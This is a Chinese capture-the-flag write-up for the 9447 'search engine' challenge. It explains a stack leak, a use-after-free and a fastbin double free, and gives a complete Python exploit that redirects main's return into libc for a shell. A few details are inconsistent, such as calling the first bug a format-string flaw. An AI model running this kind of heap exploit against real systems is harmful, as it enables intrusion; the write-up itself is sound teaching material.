# 执行环境
- 运行环境
  - Ubuntu 16.04
  - libc 2.23
- 缓解措施
  - ASLR: on
  - PIE: off (程序基地址固定为0x400000)
  - NX: on
  - RELRO: Partial RELRO
  - Canary: on (栈泄露步骤中可观察到)

# 漏洞成因
## 程序关键结构体
程序使用链表来管理索引。每个索引项（对应一个“单词”）是一个大小为0x28（40字节）的结构体。
```c
struct word_node {
    char* word_ptr;          // 指向单词字符串的指针
    int word_len;            // 单词的长度
    char* sentence_ptr;      // 指向所属完整句子的指针
    int sentence_len;        // 完整句子的长度
    struct word_node* next;  // 指向链表下一个节点的指针
};
```
全局变量 `qword_6020B8` 指向链表头部。当添加一个句子时，程序会按空格分割句子中的单词，为每个单词创建一个 `word_node` 结构体并加入链表。所有属于同一句子的 `word_node` 共享同一个 `sentence_ptr`。

## 漏洞定位
1.  **栈信息泄露漏洞**：位于 `sub_400A40` 函数（即 `read_int`）中。其调用的 `sub_4009B0` 函数在读取恰好48个字符（无换行符）时，不会在缓冲区末尾添加空字符（`\0`）。
    ```c
    sub_4009B0(nptr, 48, 1); // 如果读满48字节，nptr[48]不会被置0
    result = strtol(nptr, &endptr, 0);
    if ( endptr == nptr ){
        __printf_chk(1, "%s is not a valid number\n", nptr); // 打印未初始化的栈内容
    }
    ```

2.  **Use-After-Free (UAF) 与 Double-Free 漏洞**：位于 `sub_400AD0` 函数（即搜索并删除功能）中。当删除一个句子时，程序释放了句子内存并清零，但**没有将链表中所有指向该句子的 `word_node` 节点的 `sentence_ptr` 置空或将其从链表中移除**。
    ```c
    if ( v3[0] == 121 ) { // 用户输入'y'
        memset(*(void **)(i + 16), 0, *(int *)(i + 24)); // 清空句子内容
        free(*(void **)(i + 16)); // 释放句子内存
        puts("Deleted!");
        // 漏洞：此处未修改链表节点i中的 sentence_ptr (位于 i+16)，该指针变为悬垂指针。
        // 同时，其他指向同一句子的节点也未做处理。
    }
    ```
    这使得后续通过搜索功能可以访问已释放的内存（UAF），用于信息泄露。若再次尝试删除同一个句子（通过另一个关联的单词节点），会导致 `double-free`。

# 漏洞利用过程：
利用过程分为几个阶段：首先利用格式化字符串漏洞泄露栈地址；然后利用UAF泄露堆和libc地址，从而绕过ASLR；接着构造一个Fastbin Double-Free循环，将一次堆分配引导至栈上；最后在栈上布置ROP链或覆盖返回地址，获得shell。

- Step 1: 泄露栈地址。利用 `read_int` 的漏洞打印出栈上的数据，包含一个栈指针。
- Step 2: 泄露堆地址。分配两个小的（Fastbin大小）句子并删除，利用UAF读取Free Chunk的`fd`指针。
- Step 3: 泄露libc地址。分配一个大的（Smallbin大小）句子并删除，利用UAF读取Unsorted Bin中的`bk`指针，其指向`main_arena`。
- Step 4: 构造Fastbin Double-Free循环。分配三个小句子（A, B, C），按特定顺序全部删除，形成 `head -> A -> B -> C -> NULL` 的Free List。然后利用UAF再次释放B，形成 `head -> B -> A -> B -> ...` 的循环。
- Step 5: 利用Fastbin分配机制，篡改Free List，最终实现在栈上伪造一个Fastbin Chunk并进行分配，从而覆盖`main`函数的返回地址。
- Step 6: 退出程序，触发控制流劫持，获取shell。

## Step 1: 泄露栈地址 (leak_stack_ptr)
- **操作**：在菜单选择时，发送48个非数字字符（如`'a'*48`），触发 `strtol` 失败，导致程序打印 `nptr` 缓冲区。由于未终止，会连带打印出栈上紧随其后的数据。
- **关键内存变化**：
  - 栈上地址 `0x7ffd8ec6cca8`（示例地址）处，原本存放着栈canary等数据。当 `__printf_chk` 打印时，这些数据作为字符串的一部分被输出。从调试记录看，该地址内容为一随机值 `0x76064719d6d2f800`，这很可能是栈保护金丝雀（Canary）的一部分。
  - **变化原因**：`printf` 的输出包含了 `nptr` 之后栈上的原始内容，攻击者可以从输出中解析出栈指针值，用于后续计算目标栈地址。

## Step 2 & 3: 泄露堆与libc地址 (leak_heap_ptr, leak_libc_base)
- **操作原理**：创建并删除句子后，关联的 `word_node` 中 `sentence_ptr` 成为悬垂指针。通过搜索一个全空（`\0`）的“单词”，可以匹配到已被释放且内容被清零的句子块。程序会打印 `sentence_ptr` 指向的内存，即Free Chunk的内容。
- **堆泄露**：对于Fastbin Chunk，其`fd`指针指向下一个Free Chunk。打印出的前8字节即为堆地址。
- **libc泄露**：对于较大的、被放入Unsorted Bin的Chunk，其`bk`指针指向`main_arena`中的一个地址。打印出的8-16字节包含libc地址。
- **调试记录说明**：提供的调试记录中，堆和栈区域在Step 2和Step 3显示的内容未更新，这可能是记录点未捕捉到堆块状态变化。实际利用中，通过UAF读取已释放堆块的数据是关键步骤。

## Step 4: 构造Double-Free循环 (perform_double_free)
- **操作**：
  1.  分配三个大小均为56字节（实际Chunk大小为0x40）的句子A、B、C，内容均包含单词“ROCK”。
  2.  依次删除C、B、A。此时Fastbin Free List为：`head -> A -> B -> C -> NULL`。
  3.  利用UAF（通过搜索空单词找到B），再次删除B。此时Free List变为：`head -> B -> A -> B -> A -> ...`，形成循环。
- **关键内存变化**：
  - 堆上Fastbin Chunk B的`fd`指针原本指向C，在第二次释放B时，由于B已在Free List中，其`fd`被修改为指向当前的Free List头（即A），从而形成环。
  - **变化原因**：Fastbin的单链表结构在遇到Double-Free时，会将被二次释放的块插入链表头部，而不检查其是否已存在。

## Step 5: 控制分配至栈并覆盖返回地址 (write_to_stack_and_get_shell)
- **操作**：
  1.  第一次分配：请求一个56字节的句子。由于Free List为 `head -> B -> A -> B...`，这次分配取出B。我们可以在B中写入数据，覆盖其作为Free Chunk时的`fd`指针。我们将其`fd`覆盖为 `stackptr + 0x52`（一个计算好的栈地址）。
  2.  第二次和第三次分配：分别取出A和B。此时Free List变为：`head -> (stackptr+0x52)`。
  3.  第四次分配：程序从Free List头部取出我们的目标地址 `stackptr + 0x52`。系统将其作为一个“Free Chunk”返回给我们使用。我们在此处写入精心构造的数据。
- **关键内存变化**：
  - **Fastbin 攻击**：我们欺骗`malloc`，使其认为栈上的某个地址是一个大小为0x40的Free Chunk。这是因为我们通过错位对齐，使得栈地址 `stackptr+0x52` 所在的内存，从`malloc`的视角看，其`size`字段恰好是 `0x000000000040xxxx`，其中的 `0x40` 被解释为合法的Fastbin Chunk大小。
  - **栈覆盖**：在第四次分配得到的“句子”（即栈内存）中，我们写入数据。目标地址 `stackptr+0x52` 经过计算，最终会覆盖到`main`函数返回地址附近。Payload包含了覆盖返回地址为`system`函数地址，并布置好参数。
  - **变化原因**：通过操纵Fastbin Free List，我们控制了`malloc`返回的地址。在栈上伪造Chunk元数据后，后续的堆分配变成了栈上的任意写。

## Step 6: 触发控制流劫持 (quit_app)
- **操作**：选择菜单选项3退出程序。`main`函数返回，弹出被覆盖的返回地址，跳转到`system`函数，并获得shell。

# Exploit：
```python
import sys
from socket import *
TARGET = ('search-engine-qgidg858.9447.plumbing', 9447)

s = socket()
s.connect(TARGET)

def rd(*suffixes):
    out = ''
    while 1:
        x = s.recv(1)
        if not x:
            raise EOFError()
        sys.stdout.write(x)
        sys.stdout.flush()
        out += x
        for suffix in suffixes:
            if out.endswith(suffix):
                break
        else:
            continue
        break
    return out

def pr(x):
    s.send(str(x))
    print "<%s" % x

def menu():
    rd('3: Quit')

import re
import struct

# Step 1: 利用 read_int 的字符串未终止漏洞泄露栈地址
menu()
pr('a'*96) # 发送大量'a'，其中前48字节用于填充 nptr 缓冲区
rd('is not a valid number')
stackptr = re.findall('a{48}(......) is not', rd('is not a valid number\n'))
if not stackptr:
    raise Exception("sorry, couldn't leak stack ptr")
# 提取泄露的6字节栈指针，并补齐8字节
stackptr = struct.unpack('<Q', stackptr[0] + '\0\0')[0]
print "Leaked stack pointer:", hex(stackptr)

# Step 2: 利用UAF泄露堆地址（Fastbin）
# 分配两个小句子
menu()
pr('2\n')
pr('56\n') # 分配大小56，实际chunk大小0x40
pr('a'*50 + ' DREAM') # 内容包含单词“DREAM”

menu()
pr('2\n')
pr('56\n')
pr('b'*50 + ' DREAM') # 另一个包含“DREAM”的句子

# 搜索“DREAM”并删除两个句子，制造两个连续的Free Chunk
menu()
pr('1\n')
pr('5\n')
pr('DREAM')
pr('y\n') # 删除第一个句子
pr('y\n') # 删除第二个句子

# 通过搜索全空单词，触发UAF，读取第一个Free Chunk的fd指针（指向第二个Free Chunk）
menu()
pr('1\n')
pr('5\n')
pr('\0' * 5) # 搜索空单词，匹配被清零的句子内存
rd('Found 56: ')
# 读取句子内容，即Free Chunk的前8字节（fd）
heapptr = struct.unpack('<Q', rd('Delete')[:8])[0]
print "Leaked heap pointer:", hex(heapptr)
heapbase = heapptr & ~0xfff
pr('n\n') # 不删除（实际已无法删除，因为句子内存已free）

# Step 3: 利用UAF泄露libc地址（Smallbin/Unsorted Bin）
menu()
pr('2\n')
pr('512\n') # 分配较大块，释放后进入unsorted bin
pr(('b'*256 + ' FLOWER ').ljust(512, 'c'))

menu()
pr('1\n')
pr('6\n')
pr('FLOWER')
pr('y\n') # 删除该大句子

menu()
pr('1\n')
pr('6\n')
pr('\0'*6) # 再次通过空单词触发UAF
rd('Found 512: ')
# 读取Unsorted Bin Chunk的bk指针（位于chunk+8字节处）
libcptr = struct.unpack('<Q', rd('Delete')[:8])[0]
print "Leaked libc pointer:", hex(libcptr)
libcbase = libcptr - 0x3be7b8 # 根据libc版本计算基址
pr('n\n')

# Step 4: 构造Fastbin Double-Free循环
# 分配三个Fastbin句子
for content in ['a'*51 + ' ROCK', 'b'*51 + ' ROCK', 'c'*51 + ' ROCK']:
    menu()
    pr('2\n')
    pr('56\n')
    pr(content)

# 按顺序C、B、A全部删除，形成 A->B->C 的Free List
menu()
pr('1\n')
pr('4\n')
pr('ROCK')
pr('y\n') # 删除'c'
pr('y\n') # 删除'b'
pr('y\n') # 删除'a'

# 此时Free List: head -> A -> B -> C -> NULL
# 利用UAF再次释放B，形成循环：head -> B -> A -> B -> ...
menu()
pr('1\n')
pr('4\n')
pr('\0' * 4) # 搜索空单词找到B（A和C也可，但选B是构造需要）
pr('y\n') # 再次删除'B' (Double Free!)
pr('n\n') # 不删除'A'

# Step 5: 利用循环的Free List进行分配攻击
# 第一次分配：取出B，我们可以覆盖B的fd指针
menu()
pr('2\n')
pr('56\n')
# 将fd指针覆盖为目标栈地址（错位对齐，使其size字段被解释为0x40）
target_stack_addr = stackptr + 0x52
pr(struct.pack('<Q', target_stack_addr).ljust(48, '\0') + ' MIRACLE')

# 第二次分配：取出A
menu()
pr('2\n')
pr('56\n')
pr('d'*48 + ' MIRACLE')

# 第三次分配：取出B（再次）
menu()
pr('2\n')
pr('56\n')
pr('e'*48 + ' MIRACLE')
# 此时Free List头部变为 target_stack_addr

# 第四次分配：从伪造的栈地址“分配”内存
menu()
pr('2\n')
pr('56\n')
ret = 0x400896 # main函数中调用sub_400D60后的返回地址，或其他合适的ROP gadget
system_magic = libcbase + 0x4652c # libc中system函数的地址
# 构造payload，覆盖返回地址为system，并布置参数（这里利用了栈上已有的数据或特定布局）
pr(('A'*6 + struct.pack('<QQQQ', ret, ret, ret, system_magic)).ljust(56, 'U'))

# Step 6: 触发控制流劫持
menu()
pr('3\n') # 退出，main函数返回，跳转到system

# 交互模式，获得shell
import telnetlib
t = telnetlib.Telnet()
t.sock = s
t.interact()

# 9447{this_w4S_heAPs_0f_FUn}
```